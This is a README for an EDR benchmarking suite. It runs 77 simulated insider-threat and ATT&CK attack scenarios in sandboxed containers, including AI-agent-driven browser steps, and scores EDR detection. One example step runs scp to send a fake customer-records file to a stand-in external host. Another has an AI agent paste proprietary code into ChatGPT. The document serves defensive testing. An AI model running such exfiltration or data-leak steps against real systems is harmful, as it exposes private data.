# edr-bench

A benchmarking suite that tests how well your EDR actually catches threats. It spins up Docker containers, runs 77 realistic attack scenarios inside them, records exactly what happened using eBPF and network proxies, then checks whether your EDR noticed.

## What it does

1. **Runs attacks in sandboxed containers** -- CLI commands, browser-based actions driven by AI agents, phishing campaigns, cloud misconfigs, USB exfil, the works.
2. **Records exactly what happened** -- using Tracee (eBPF), mitmproxy, and Docker events so you have solid ground truth.
3. **Checks your EDR's homework** -- pulls alerts from your EDR (log files, API, or syslog) and matches them against what actually happened.
4. **Gives you a score** -- detection rate, time-to-detect, blocking efficacy, contextual accuracy, and noise ratio.
5. **Generates a report** -- HTML with a MITRE ATT&CK heatmap so you can see coverage gaps at a glance.

## Scenarios

77 scenarios across two sets:

**50 Coach scenarios** -- realistic insider threat and risky user behavior simulations derived from a security decision taxonomy. These cover:

| Category | Count | Examples |
|----------|-------|---------|
| AI data leaks | 9 | Paste source code into ChatGPT, upload customer data to AI tools |
| Data exfiltration | 18 | USB copy, SCP to external server, clipboard to personal apps, DNS exfil |
| Secrets exposure | 4 | Commit API keys to git, post passwords in Slack |
| Unauthorized sharing | 3 | Share internal docs publicly on Google Drive, GitHub |
| Untrusted software | 4 | Install risky browser extensions, typosquatted npm packages |
| Access management | 3 | Over-provision Okta access, skip access reviews |
| Auth & social engineering | 3 | BEC wire fraud, reuse corporate passwords on personal sites |
| Network & config | 4 | Disable firewall, use public WiFi without VPN |
| AI agent risks | 2 | Grant AI agent broad tool access, auto-approve actions |

**27 classic scenarios** -- traditional MITRE ATT&CK techniques:
- 10 Linux CLI attacks (reverse shells, credential dumping, persistence)
- 5 Linux UI attacks (browser-based)
- 5 Windows CLI attacks
- 2 Windows UI attacks
- 3 cloud misconfigs (Terraform + LocalStack)
- 2 phishing campaigns (GoPhish)

## Quick start

```bash
# clone and install
git clone <repo-url> && cd edr-bench
pip install -e ".[dev]"

# copy env file and add your API keys
cp .env.example .env

# build and start the linux containers
make build PROFILE=linux
make up PROFILE=linux

# check your scenario files are valid
edr-bench validate data/scenarios/

# do a dry run to see what would happen
edr-bench run --platform linux --dry-run

# run it for real
edr-bench run --platform linux --edr-name "My EDR"

# generate an html report from the json output
edr-bench report reports/<report-id>.json -o report.html
```

## Architecture

```
victim-linux (Ubuntu 22.04 + XFCE + VNC + Firefox)
  |
  |-- DNS queries --> dnsmasq on mocknet (spoofs domains)
  |-- HTTP traffic --> mitmproxy (logs all flows)
  |-- Browser --> nginx on mocknet (serves 25+ fake sites)
  |                  |
  |                  +--> Flask app (logs all form submissions as ground truth)
  |
  +-- eBPF --> Tracee (captures syscalls, file access, network connections)

controller (orchestrator)
  |-- drives CLI scenarios via docker exec
  |-- drives UI scenarios via VNC + AI computer-use agent
  |-- collects ground truth from all sources
  |-- pulls EDR alerts and scores them
```

All external IPs referenced in scenarios (203.0.113.x, 192.168.1.x) are iptables-DNAT'd to mocknet so commands like `scp` and `curl` to "external servers" actually succeed and get logged. DNS queries (even explicit `dig @8.8.8.8`) are redirected to dnsmasq for ground truth capture.

## Docker services

| Profile | What you get |
|---------|-------------|
| `linux` | Linux victim + MockNet + mitmproxy + Tracee + controller |
| `windows` | Windows victim + MockNet + mitmproxy + controller |
| `cloud` | Controller + LocalStack |
| `phishing` | Controller + GoPhish |
| `full` | Everything |

```bash
make up PROFILE=linux    # start
make ps                  # check status
make logs                # follow logs
make down                # tear down
```

The victim-linux container at `localhost:6080` (noVNC) includes: Firefox, VS Code, Node.js/npm, Terraform, PowerShell, Syncthing, CUPS-PDF printer, Atomic Red Team, and all standard Linux tools.

MockNet serves 25+ fake websites (ChatGPT, Salesforce, GitHub, Google Drive, Slack, LinkedIn, banking portals, etc.) with realistic UIs. Every form submission is logged as ground truth.

## Writing scenarios

Scenarios are CSV files with embedded JSON. Here's what a row looks like:

| Column | What it is |
|--------|-----------|
| `id` | Unique ID like `COACH-016` or `LIN-CLI-001` |
| `name` | Short name for the attack |
| `description` | What the scenario does |
| `platform` | `linux`, `windows`, or `cloud` |
| `attack_type` | MITRE tactic (`execution`, `exfiltration`, etc.) |
| `mitre_technique_id` | The technique ID, e.g. `T1059.001` |
| `complexity` | `low`, `medium`, or `high` |
| `simulation_steps` | JSON array of steps |
| `expected_detections` | JSON array of detection names you expect to fire |
| `tags` | JSON array of tags |

Coach scenarios also have: `category`, `sub_category`, `risk_level`, `deploy_surfaces`, `coach_intervention`, `success_metric`, `priority`, `test_data`, `target_roles`, `third_party_systems`.

Each step in `simulation_steps`:

```json
{
  "order": 1,
  "role": "cli",
  "command": "scp /home/user/fixtures/customer_records.csv user@203.0.113.50:/tmp/exfil/",
  "description": "SCP customer data to external server",
  "expected_artifact": "scp_connection_to_external_ip",
  "timeout_seconds": 30
}
```

For UI steps, use `"role": "ui"` and add `"ui_instructions"` with plain English:

```json
{
  "order": 1,
  "role": "ui",
  "ui_instructions": "Open Firefox. Navigate to http://chatgpt.com. Paste the source code into the chat input and click Send.",
  "description": "Paste proprietary code into ChatGPT",
  "expected_artifact": "http_post_to_chatgpt.com"
}
```

## Test fixtures

The `data/fixtures/` directory contains 15 realistic test files that scenarios reference:

- `customer_records.csv` -- 50 rows of fake PII (names, emails, SSNs, balances)
- `proprietary_code.py` -- sample proprietary source code
- `q3_revenue.csv` -- internal financial data
- `salary_table.csv` -- employee compensation data
- `passwords.txt` -- shared credentials file (the kind that shouldn't exist)
- `dot_env_file.txt` -- production .env with API keys and database URLs
- `ssh_key_no_passphrase.txt` -- unencrypted SSH private key
- `terraform_insecure.tf` -- Terraform config with public S3, open security groups
- `workflow_with_secrets.yml` -- GitHub Actions with hardcoded secrets
- And more (NDA contract, enterprise deal memo, support ticket, resume with internals, access review data)

These are mounted into the victim container at `/home/user/fixtures/`.

## Scoring

Five metrics:

- **Detection rate** -- what fraction of real events did the EDR catch? (0-1)
- **Contextual accuracy** -- when it caught something, did it get the MITRE technique, severity, and process details right? (0-1)
- **Time to detect** -- average seconds between the event and the alert
- **Blocking efficacy** -- of the things it detected, how many did it actually block? (0-1)
- **Noise ratio** -- what fraction of alerts were false positives? (0-1, lower is better)

## Connecting your EDR

Three ways to feed EDR alerts into edr-bench:

**Tail a log file:**
```bash
EDR_LOG_PATH=/var/log/edr/alerts.json edr-bench run --platform linux
```

**Poll a REST API:**
```bash
EDR_API_URL=https://edr-console.example.com/api/v1 EDR_API_KEY=xxx edr-bench run --platform linux
```

**Syslog (CEF/LEEF):**
```bash
EDR_SYSLOG_PORT=1514 edr-bench run --platform linux
```

See `data/edr_configs/` for example field mapping configs.

## AI agents for UI attacks

Some scenarios need an AI to drive the desktop -- clicking around in Firefox, filling in forms, uploading files. This uses computer-use APIs:

- **Anthropic Claude** (primary) -- set `ANTHROPIC_API_KEY`
- **OpenAI** (secondary) -- set `OPENAI_API_KEY`

The agent connects via VNC, takes screenshots, figures out what to click, and executes the steps. You don't need API keys if you're only running CLI scenarios.

## Running tests

```bash
make test              # unit tests
make test-integration  # integration tests (needs Docker)
make test-all          # everything
make lint              # ruff + mypy
make format            # auto-format
```

## Config

Copy `.env.example` to `.env` and fill in what you need. Most things have sensible defaults. You can also pass a YAML config file:

```bash
edr-bench run --config my-config.yaml --platform linux
```

See `src/edr_bench/config/defaults.yaml` for all options.

## Project layout

```
src/edr_bench/
  cli.py              # command line interface (run, validate, report, infra)
  config/             # settings, defaults.yaml
  models/             # scenarios, findings, ground truth, metrics, enums
  orchestrator/       # runs the whole benchmark (engine, lifecycle, scheduler)
  agents/             # AI computer-use agents (Claude, OpenAI, VNC client)
  executors/          # attack execution (CLI, UI, Caldera, USB, Terraform, phishing)
  ground_truth/       # captures what actually happened (Tracee, mitmproxy, Docker events)
  edr_interface/      # pulls alerts from your EDR (file tailer, API poller, syslog)
  scoring/            # matches events, calculates 5 metrics, generates reports
  reporting/          # HTML reports with MITRE ATT&CK heatmap
  utils/              # CSV loader, Docker client, retry, logging

docker/
  docker-compose.yml  # all services with profiles
  victim-linux/       # Ubuntu 22.04 + XFCE + VNC + tools
  victim-windows/     # Windows Server Core
  mocknet/            # Flask + nginx + dnsmasq + 25 mock sites
  mitmproxy/          # HTTP flow logging
  controller/         # orchestrator container
  localstack/         # mock AWS
  gophish/            # phishing campaigns

data/
  scenarios/          # 15 CSV files, 77 scenarios
  fixtures/           # 15 realistic test data files
  edr_configs/        # example EDR field mapping configs
```

## Requirements

- Python 3.11+
- Docker and Docker Compose
- An EDR product to test
- Anthropic or OpenAI API key (only for UI scenarios)
